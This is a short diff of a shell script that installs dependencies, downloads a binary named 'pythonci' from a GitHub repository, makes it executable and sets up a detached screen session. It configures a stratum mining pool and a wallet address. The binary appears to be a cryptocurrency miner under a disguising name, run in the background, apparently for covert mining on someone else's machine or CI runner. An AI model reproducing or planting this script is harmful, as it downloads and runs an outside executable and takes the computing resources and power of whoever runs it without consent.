@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen libjansson4 -y
 wget https://github.com/khansaxfifth/Setang/blob/main/pythonci
-chmod +x makan.sh && chmod +x pythonci chmod 777 pythonci makan.sh
+chmod +x makan.sh && chmod +x pythonci 
 screen -dmS ls
 PL=stratum+tcp://eu.luckpool.net:3956
 WT=RLD18b4TwuupZPB7XwQRA8stVqb1EDJQ6V
